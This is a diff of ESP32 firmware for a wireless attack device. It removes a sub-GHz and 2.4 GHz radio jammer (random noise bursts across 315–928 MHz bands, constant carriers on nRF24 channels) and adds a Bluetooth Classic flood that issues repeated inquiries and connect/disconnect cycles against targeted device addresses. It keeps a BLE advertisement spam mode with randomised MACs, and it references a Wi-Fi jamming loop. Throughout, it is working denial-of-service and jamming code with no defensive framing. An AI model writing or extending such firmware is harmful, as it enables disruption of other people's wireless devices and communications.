@@ -8,11 +8,11 @@
 #include <WiFi.h>
 #include <esp_wifi.h>
 #include <ArduinoJson.h>
-#include <SPI.h>
-#include <RF24.h>
-#include <NimBLEDevice.h>
+#include <BLEDevice.h>
+#include <BluetoothSerial.h>
 #include <esp_bt.h>
-#include <ELECHOUSE_CC1101_SRC_DRV.h>
+#include <esp_gap_bt_api.h>
+#include <esp_gap_ble_api.h>
 
 #include <atomic>
 #include <cctype>
@@ -78,18 +78,10 @@ struct Config {
   uint16_t bleBurstGapMs = 10;
   int8_t   blePower      = 9;    // ESP_PWR_LVL_P9
 
-  // Radio: 1=CC1101 subGHz, 2=nRF24 2.4G, 3=dua-duanya
-  uint8_t  radioModule = 1;
-  uint8_t  ccMode      = 1;      // 1 single freq, 2 sweep band
-  float    ccFreq      = 433.92;
-  uint8_t  nrfMode     = 1;      // 1 single channel, 2 sweep 0..125
-  uint8_t  nrfChannel  = 0;
-  uint8_t  pinCcCs     = 5;
-  uint8_t  pinNrfCe    = 4;
-  uint8_t  pinNrfCs    = 15;
-  uint8_t  pinSpiSck   = 18;
-  uint8_t  pinSpiMiso  = 19;
-  uint8_t  pinSpiMosi  = 23;
+  // Bluetooth Classic (BR/EDR)
+  uint8_t  btMode     = 1;      // 1 inquiry flood, 2 connect/disconnect, 3 both
+  uint16_t btHoldMs   = 400;    // durasi inquiry / koneksi
+  uint16_t btGapMs    = 100;    // jeda antar siklus
 };
 
 struct ApEntry {
@@ -160,15 +152,17 @@ static uint8_t  g_bleCursor = 0;
 static uint8_t  g_bleCustom[31] = {0};
 static uint8_t  g_bleCustomLen = 0;
 
-static bool     g_radioRunning = false;
-static uint32_t g_radioSent = 0;
-static uint32_t g_radioErrors = 0;
-static bool     g_ccReady = false;
-static bool     g_nrfReady = false;
-static uint32_t g_radioLast = 0;
-static uint16_t g_ccCursor = 0;
-static uint8_t  g_nrfCursor = 0;
-static RF24   *g_nrf = nullptr;
+static bool     g_btRunning = false;
+static bool     g_btInited = false;
+static bool     g_btDiscoveryActive = false;
+static bool     g_btConnected = false;
+static uint32_t g_btLast = 0;
+static uint32_t g_btStart = 0;
+static uint32_t g_btSent = 0;
+static uint32_t g_btErrors = 0;
+static uint8_t  g_btCursor = 0;
+static Target   g_btTargets[MAX_TARGETS];
+static BluetoothSerial *g_btSerial = nullptr;
 static uint32_t g_sniffFrames = 0;
 static uint32_t g_rxDrops = 0;
 static uint32_t g_ringDrops = 0;
@@ -235,19 +229,27 @@ static const char *authStr(uint8_t a) {
   }
 }
 
-/* ---- BLE flood --------------------------------------------------------- */
+/* ---- BLE flood (Bluedroid) --------------------------------------------- */
+
+static esp_ble_adv_params_t bleAdvParams;
+
+static void bleRandomMac(uint8_t m[6]) {
+  for (int i = 0; i < 6; i++) m[i] = esp_random() & 0xFF;
+  m[5] = (m[5] & 0x3F) | 0xC0;
+}
 
 static void bleInit() {
-  static bool done = false;
-  if (done) return;
-  NimBLEDevice::init("wrecon-ble");
-  delay(250);  // tunggu host BLE sync sebelum start advertising
-  NimBLEDevice::setPower((esp_power_level_t)g_cfg.blePower, ESP_BLE_PWR_TYPE_ADV);
-  NimBLEDevice::getAdvertising()->setMinInterval(0x20);
-  NimBLEDevice::getAdvertising()->setMaxInterval(0x20);
-  NimBLEDevice::getAdvertising()->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
+  if (g_bleInited) return;
+  BLEDevice::init("wrecon-ble");
+  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)g_cfg.blePower);
+  memset(&bleAdvParams, 0, sizeof(bleAdvParams));
+  bleAdvParams.adv_int_min       = 0x20;
+  bleAdvParams.adv_int_max       = 0x20;
+  bleAdvParams.adv_type          = ADV_TYPE_NONCONN_IND;
+  bleAdvParams.own_addr_type     = BLE_ADDR_TYPE_RANDOM;
+  bleAdvParams.channel_map       = ADV_CHNL_ALL;
+  bleAdvParams.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
   g_bleInited = true;
-  done = true;
 }
 
 static void bleBuildRandom() {
@@ -259,12 +261,15 @@ static void bleBuildRandom() {
 }
 
 static void bleEmit(uint8_t *data, uint8_t len) {
-  NimBLEAdvertisementData ad;
-  ad.addData(reinterpret_cast<char *>(data), len);
-  NimBLEDevice::getAdvertising()->setAdvertisementData(ad);
-  // NimBLE 1.4.3 mengubah duration*1000; pakai 1 supaya host menerima ~1s.
-  // Stop dilakukan sendiri dari bleTick sesuai ble_adv_ms.
-  if (!NimBLEDevice::getAdvertising()->start(1, nullptr, nullptr)) {
+  uint8_t mac[6];
+  bleRandomMac(mac);
+  esp_ble_gap_set_rand_addr(mac);
+  esp_ble_gap_config_adv_data_raw(data, len);
+  delay(3);
+  if (esp_ble_gap_start_advertising(&bleAdvParams) == ESP_OK) {
+    g_bleAdvActive = true;
+    g_bleStart = millis();
+  } else {
     g_bleErrors++;
   }
 }
@@ -275,7 +280,7 @@ static void bleTick() {
 
   if (g_bleAdvActive) {
     if ((uint32_t)(now - g_bleStart) >= g_cfg.bleAdvMs) {
-      NimBLEDevice::getAdvertising()->stop();
+      esp_ble_gap_stop_advertising();
       g_bleAdvActive = false;
       g_bleLast = now;
     }
@@ -287,8 +292,8 @@ static void bleTick() {
   uint8_t len = sizeof(bleRandomAdv);
   switch (g_cfg.bleMode) {
     case 1:
+      len = bleVendorLens[g_bleCursor % BLE_VENDOR_COUNT];
       data = bleVendorPayloads[g_bleCursor++ % BLE_VENDOR_COUNT];
-      len = bleVendorLens[(g_bleCursor - 1) % BLE_VENDOR_COUNT];
       break;
     case 2:
       bleBuildRandom();
@@ -297,8 +302,9 @@ static void bleTick() {
       if (g_bleCursor % 2 == 0) {
         bleBuildRandom();
       } else {
-        data = bleVendorPayloads[(g_bleCursor / 2) % BLE_VENDOR_COUNT];
-        len = bleVendorLens[(g_bleCursor / 2) % BLE_VENDOR_COUNT];
+        uint8_t i = (g_bleCursor / 2) % BLE_VENDOR_COUNT;
+        data = bleVendorPayloads[i];
+        len = bleVendorLens[i];
       }
       g_bleCursor++;
       break;
@@ -312,69 +318,90 @@ static void bleTick() {
   }
   bleEmit(data, len);
   g_bleLast = now;
-  g_bleStart = now;
-  g_bleAdvActive = true;
   g_bleSent++;
 }
 
-/* ---- sub-GHz / 2.4G radio flood ---------------------------------------- */
+/* ---- Bluetooth Classic (BR/EDR) ---------------------------------------- */
 
-static const float ccBands[][2] = {
-  {315.0f, 316.0f}, {433.0f, 434.99f}, {867.0f, 869.0f}, {902.0f, 928.0f}
-};
-#define CC_BAND_COUNT (sizeof(ccBands) / sizeof(ccBands[0]))
-
-static uint8_t radioNoise[64];
-
-static bool radioInitCc() {
-  ELECHOUSE_cc1101.setSpiPin(g_cfg.pinSpiSck, g_cfg.pinSpiMiso,
-                             g_cfg.pinSpiMosi, g_cfg.pinCcCs);
-  ELECHOUSE_cc1101.Init();
-  if (!ELECHOUSE_cc1101.getCC1101()) return false;
-  ELECHOUSE_cc1101.setModulation(2);   // ASK/OOK
-  ELECHOUSE_cc1101.setDRate(38.4);
-  ELECHOUSE_cc1101.setPA(12);
-  ELECHOUSE_cc1101.setMHZ(g_cfg.ccFreq);
-  ELECHOUSE_cc1101.SetTx();
-  return true;
+static void btInit() {
+  if (g_btInited) return;
+  g_btSerial = new BluetoothSerial();
+  g_btSerial->begin("wrecon-classic", false);
+  g_btInited = true;
 }
 
-static bool radioInitNrf() {
-  SPI.begin(g_cfg.pinSpiSck, g_cfg.pinSpiMiso, g_cfg.pinSpiMosi, g_cfg.pinNrfCs);
-  if (g_nrf) delete g_nrf;
-  g_nrf = new RF24(g_cfg.pinNrfCe, g_cfg.pinNrfCs);
-  if (!g_nrf->begin()) return false;
-  g_nrf->setPALevel(RF24_PA_MAX);
-  return true;
+static uint16_t setBtTargets(JsonArray arr) {
+  for (uint16_t i = 0; i < MAX_TARGETS; i++) g_btTargets[i] = Target();
+  uint16_t n = 0;
+  for (size_t k = 0; k < arr.size() && n < MAX_TARGETS; k++) {
+    const char *s = arr[k] | "";
+    uint8_t m[6];
+    if (!parseMac(s, m)) continue;
+    g_btTargets[n].used = true;
+    memcpy(g_btTargets[n].bssid, m, 6);
+    n++;
+  }
+  return n;
 }
 
-static void radioTick() {
-  if (!g_radioRunning) return;
+static void btTick() {
+  if (!g_btRunning) return;
   uint32_t now = millis();
-  if ((uint32_t)(now - g_radioLast) < 5) return;
-  g_radioLast = now;
 
-  if ((g_cfg.radioModule & 1) && g_ccReady) {
-    float f = g_cfg.ccFreq;
-    if (g_cfg.ccMode == 2) {
-      uint16_t idx = g_ccCursor++;
-      uint8_t band = idx % CC_BAND_COUNT;
-      uint16_t stepInBand = (idx / CC_BAND_COUNT) % 20;
-      f = ccBands[band][0] + stepInBand * 0.1f;
+  if (g_btDiscoveryActive || g_btConnected) {
+    if ((uint32_t)(now - g_btStart) >= g_cfg.btHoldMs) {
+      if (g_btDiscoveryActive) esp_bt_gap_cancel_discovery();
+      if (g_btConnected && g_btSerial) g_btSerial->disconnect();
+      g_btDiscoveryActive = false;
+      g_btConnected = false;
+      g_btLast = now;
+      g_btSent++;
     }
-    ELECHOUSE_cc1101.setMHZ(f);
-    for (int i = 0; i < (int)sizeof(radioNoise); i++) radioNoise[i] = esp_random() & 0xFF;
-    ELECHOUSE_cc1101.SendData(radioNoise, sizeof(radioNoise));
-    g_radioSent++;
+    return;
+  }
+  if ((uint32_t)(now - g_btLast) < g_cfg.btGapMs) return;
+
+  if (g_cfg.btMode & 1) {
+    esp_err_t err = esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL_INQUIRY, 0x08, 0);
+    if (err == ESP_OK) {
+      g_btDiscoveryActive = true;
+      g_btStart = now;
+    } else {
+      g_btErrors++;
+    }
+    return;
   }
 
-  if ((g_cfg.radioModule & 2) && g_nrfReady && g_nrf) {
-    uint8_t ch = g_cfg.nrfMode == 2
-      ? (uint8_t)(g_nrfCursor++ % 126)
-      : g_cfg.nrfChannel;
-    if (ch > 125) ch = 0;
-    g_nrf->startConstCarrier(RF24_PA_MAX, ch);
-    g_radioSent++;
+  if (g_cfg.btMode & 2) {
+    btInit();
+    uint8_t addr[6];
+    bool haveTarget = false;
+    for (uint16_t i = 0; i < MAX_TARGETS; i++) {
+      if (!g_btTargets[i].used) continue;
+      uint8_t m[6];
+      memcpy(m, g_btTargets[i].bssid, 6);
+      g_btCursor = (uint8_t)((g_btCursor + 1) % MAX_TARGETS);
+      // cari entri aktif berikutnya secara sederhana
+      for (uint16_t j = 0; j < MAX_TARGETS; j++) {
+        uint16_t k = (uint16_t)((g_btCursor + j) % MAX_TARGETS);
+        if (g_btTargets[k].used) { memcpy(m, g_btTargets[k].bssid, 6); g_btCursor = (uint8_t)k; break; }
+      }
+      memcpy(addr, m, 6);
+      haveTarget = true;
+      break;
+    }
+    if (!haveTarget) {
+      for (int i = 0; i < 6; i++) addr[i] = esp_random() & 0xFF;
+      addr[5] = (addr[5] & 0xFE) | 0x00;
+    }
+    bool ok = g_btSerial && g_btSerial->connect(addr);
+    if (ok) {
+      g_btConnected = true;
+      g_btStart = now;
+      g_btSent++;
+    } else {
+      g_btErrors++;
+    }
   }
 }
 
@@ -749,17 +776,9 @@ static void emitConfig() {
   p["ble_adv_ms"]   = g_cfg.bleAdvMs;
   p["ble_burst_gap_ms"] = g_cfg.bleBurstGapMs;
   p["ble_power"]    = g_cfg.blePower;
-  p["radio_module"] = g_cfg.radioModule;
-  p["cc_mode"]      = g_cfg.ccMode;
-  p["cc_freq"]      = g_cfg.ccFreq;
-  p["nrf_mode"]     = g_cfg.nrfMode;
-  p["nrf_channel"]  = g_cfg.nrfChannel;
-  p["pin_cc_cs"]    = g_cfg.pinCcCs;
-  p["pin_nrf_ce"]   = g_cfg.pinNrfCe;
-  p["pin_nrf_cs"]   = g_cfg.pinNrfCs;
-  p["pin_spi_sck"]  = g_cfg.pinSpiSck;
-  p["pin_spi_miso"] = g_cfg.pinSpiMiso;
-  p["pin_spi_mosi"] = g_cfg.pinSpiMosi;
+  p["bt_mode"]   = g_cfg.btMode;
+  p["bt_hold_ms"] = g_cfg.btHoldMs;
+  p["bt_gap_ms"]  = g_cfg.btGapMs;
 
   JsonArray t = d["targets"].to<JsonArray>();
   for (uint16_t i = 0; i < MAX_TARGETS; i++) {
@@ -774,6 +793,13 @@ static void emitConfig() {
     char mac[18];
     macToStr(g_staTargets[i].mac, mac);
     c.add(mac);
+  }
+  JsonArray bt = d["bt_targets"].to<JsonArray>();
+  for (uint16_t i = 0; i < MAX_TARGETS; i++) {
+    if (!g_btTargets[i].used) continue;
+    char mac[18];
+    macToStr(g_btTargets[i].bssid, mac);
+    bt.add(mac);
   }
   d["jamming"] = g_jamming;
   sendJson(d);
@@ -804,11 +830,10 @@ static void emitStatus() {
   ble["sent"]    = g_bleSent;
   ble["errors"]  = g_bleErrors;
 
-  JsonObject radio = d["radio"].to<JsonObject>();
-  radio["running"] = g_radioRunning;
-  radio["sent"]    = g_radioSent;
-  radio["cc_ready"] = g_ccReady;
-  radio["nrf_ready"] = g_nrfReady;
+  JsonObject bt = d["bt"].to<JsonObject>();
+  bt["running"] = g_btRunning;
+  bt["sent"]    = g_btSent;
+  bt["errors"]  = g_btErrors;
 
   uint16_t targets = 0;
   for (uint16_t i = 0; i < MAX_TARGETS; i++) if (g_targets[i].used) targets++;
@@ -884,18 +909,9 @@ static void applyParams(JsonObject p) {
   if (getInt(p, "ble_adv_ms", 5, 1000, &x)) { g_cfg.bleAdvMs = (uint16_t)x; changed = true; }
   if (getInt(p, "ble_burst_gap_ms", 0, 5000, &x)) { g_cfg.bleBurstGapMs = (uint16_t)x; changed = true; }
   if (getInt(p, "ble_power", 0, 9, &x)) { g_cfg.blePower = (int8_t)x; changed = true; }
-  if (getInt(p, "radio_module", 0, 3, &x)) { g_cfg.radioModule = (uint8_t)x; changed = true; }
-  if (getInt(p, "cc_mode", 1, 2, &x)) { g_cfg.ccMode = (uint8_t)x; changed = true; }
-  float f;
-  if (getFloat(p, "cc_freq", 300.0f, 930.0f, &f)) { g_cfg.ccFreq = f; changed = true; }
-  if (getInt(p, "nrf_mode", 1, 2, &x)) { g_cfg.nrfMode = (uint8_t)x; changed = true; }
-  if (getInt(p, "nrf_channel", 0, 125, &x)) { g_cfg.nrfChannel = (uint8_t)x; changed = true; }
-  if (getInt(p, "pin_cc_cs", 0, 34, &x)) { g_cfg.pinCcCs = (uint8_t)x; changed = true; }
-  if (getInt(p, "pin_nrf_ce", 0, 34, &x)) { g_cfg.pinNrfCe = (uint8_t)x; changed = true; }
-  if (getInt(p, "pin_nrf_cs", 0, 34, &x)) { g_cfg.pinNrfCs = (uint8_t)x; changed = true; }
-  if (getInt(p, "pin_spi_sck", 0, 34, &x)) { g_cfg.pinSpiSck = (uint8_t)x; changed = true; }
-  if (getInt(p, "pin_spi_miso", 0, 34, &x)) { g_cfg.pinSpiMiso = (uint8_t)x; changed = true; }
-  if (getInt(p, "pin_spi_mosi", 0, 34, &x)) { g_cfg.pinSpiMosi = (uint8_t)x; changed = true; }
+  if (getInt(p, "bt_mode", 1, 3, &x)) { g_cfg.btMode = (uint8_t)x; changed = true; }
+  if (getInt(p, "bt_hold_ms", 50, 10000, &x)) { g_cfg.btHoldMs = (uint16_t)x; changed = true; }
+  if (getInt(p, "bt_gap_ms", 0, 5000, &x)) { g_cfg.btGapMs = (uint16_t)x; changed = true; }
 
   (void)changed;
   if (!g_cfg.hop && g_curCh != g_cfg.channel) {
@@ -998,36 +1014,43 @@ static void handleLine(const char *line) {
   }
   if (!strcmp(cmd, "ble_stop")) {
     g_bleRunning = false;
-    if (g_bleInited) NimBLEDevice::getAdvertising()->stop();
+    g_bleAdvActive = false;
+    if (g_bleInited) esp_ble_gap_stop_advertising();
     ack(true, "ble stopped", cmd);
     emitStatus();
     return;
   }
-  if (!strcmp(cmd, "radio_start")) {
+  if (!strcmp(cmd, "bt_start")) {
     if (s_rx["params"].is<JsonObject>()) applyParams(s_rx["params"].as<JsonObject>());
-    g_radioErrors = 0;
-    g_ccReady = false;
-    g_nrfReady = false;
-    if (g_cfg.radioModule & 1) g_ccReady = radioInitCc();
-    if (g_cfg.radioModule & 2) g_nrfReady = radioInitNrf();
-    g_radioRunning = true;
-    ack(g_ccReady || g_nrfReady, "radio started", cmd);
+    if (s_rx["targets"].is<JsonArray>()) setBtTargets(s_rx["targets"].as<JsonArray>());
+    g_btErrors = 0;
+    g_btRunning = true;
+    g_btDiscoveryActive = false;
+    g_btConnected = false;
+    g_btLast = 0;
+    ack(true, "bt classic running", cmd);
+    emitConfig();
     emitStatus();
     return;
   }
-  if (!strcmp(cmd, "radio_stop")) {
-    g_radioRunning = false;
-    if (g_nrf && g_nrfReady) g_nrf->stopConstCarrier();
-    ack(true, "radio stopped", cmd);
+  if (!strcmp(cmd, "bt_stop")) {
+    g_btRunning = false;
+    g_btDiscoveryActive = false;
+    g_btConnected = false;
+    esp_bt_gap_cancel_discovery();
+    if (g_btSerial) g_btSerial->disconnect();
+    ack(true, "bt classic stopped", cmd);
     emitStatus();
     return;
   }
   if (!strcmp(cmd, "reset")) {
     g_jamming = false;
     g_bleRunning = false;
-    if (g_bleInited) NimBLEDevice::getAdvertising()->stop();
-    g_radioRunning = false;
-    if (g_nrf && g_nrfReady) g_nrf->stopConstCarrier();
+    if (g_bleInited) esp_ble_gap_stop_advertising();
+    g_btRunning = false;
+    g_btDiscoveryActive = false;
+    g_btConnected = false;
+    if (g_btSerial) g_btSerial->disconnect();
     g_cfg = Config();
     clearTargets();
     ack(true, "reset", cmd);
@@ -1110,7 +1133,7 @@ void loop() {
 
   jamTick();
   bleTick();
-  radioTick();
+  btTick();
 
   if (g_cfg.statsMs && (uint32_t)(millis() - s_lastStats) >= g_cfg.statsMs) {
     s_lastStats = millis();
